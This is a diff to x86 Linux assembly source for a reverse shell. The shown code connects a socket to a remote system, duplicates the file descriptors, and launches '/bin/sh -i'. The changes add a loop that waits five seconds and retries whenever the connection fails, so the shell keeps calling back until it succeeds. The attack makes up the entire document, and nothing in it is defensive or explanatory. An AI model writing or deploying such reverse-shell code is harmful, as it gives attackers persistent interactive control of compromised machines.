@@ -1,10 +1,13 @@
 global _start
 
 section .data
-        prompt db 10," > ",0
-        len equ $-prompt
-        ps1 db "PS1=test ",0
-        envs dd ps1,0
+        wait_str db 10,"Wait 5 seconds...",0
+        wait_str_len equ $ - wait_str
+	shell db "/bin/sh",0
+        ;ps1 db "PS1=test",0
+        ;envs dd ps1,0
+	arg1 db "-i",0
+	args dd shell,arg1,0
 
 section .text
 
@@ -30,6 +33,20 @@ _start:
         int 0x80
 
 ; Connect socket to remote system
+        ;push eax
+        ;mov eax, 4
+        ;mov ebx, 1
+        ;xor ecx, ecx
+        ;push ecx
+        ;push 0x0000002e
+        ;push 0x2e2e7463
+        ;push 0x656e6e6f
+        ;push 0x63206f74
+        ;push 0x20797254
+        ;mov ecx, esp
+        ;mov edx, 18
+        ;int 0x80
+        ;pop eax
 
         ; save return value of socket syscall - socket file descriptor
         xor edx, edx
@@ -57,17 +74,52 @@ _start:
         mov ecx, esp
         int 0x80
 
-label:
+breakpoint:
+        cmp eax, 0
+        jne wait_sec
+        jmp connected
+
+wait_sec:
+
+        push eax
+        push ebx
+        push ecx
         push edx
 
         mov eax, 4
-        mov ebx, [esp]
-        mov ecx, prompt
-        mov edx, len
+        mov ebx, 1
+        mov ecx, wait_str
+        mov edx, wait_str_len
         int 0x80
 
-        pop edx
+        mov eax, 0x0D
+        push byte 0x00
+        mov ebx, esp
+        xor ecx, ecx
+        xor edx, edx
+        int 0x80
 
+        mov esi, eax
+        add esi, 5
+L2:
+        mov eax, 0x0D
+        mov ebx, esp
+        xor ecx, ecx
+        xor edx, edx
+        int 0x80
+
+        cmp eax, esi
+        jl L2
+
+        pop esi
+        pop edx
+        pop ecx
+        pop ebx
+        pop eax
+
+        jmp _start
+
+connected:
 ; Duplicate file descriptors
 
         ; push arguments for dup2 syscall
@@ -91,17 +143,11 @@ debug1:
         ; exeve syscall
         mov al, 0xb
         ; int execve(const char *pathname, char *const argv[], char *const envp[]);
-        ; push //bin/sh on stack
         xor ebx, ebx
         push ebx                ; Null
-	push 0x0068732f
-        push 0x6e69622f
-	mov ebx, esp
+	mov ebx, shell
         xor ecx, ecx
-	push ecx		; Null
-	;push 0x74736574
-	;push 0x3d315350
+	mov ecx, args
         xor edx, edx
-	mov edx, envs
+	;mov edx, envs ; edx = [ps1]
         int 0x80
-
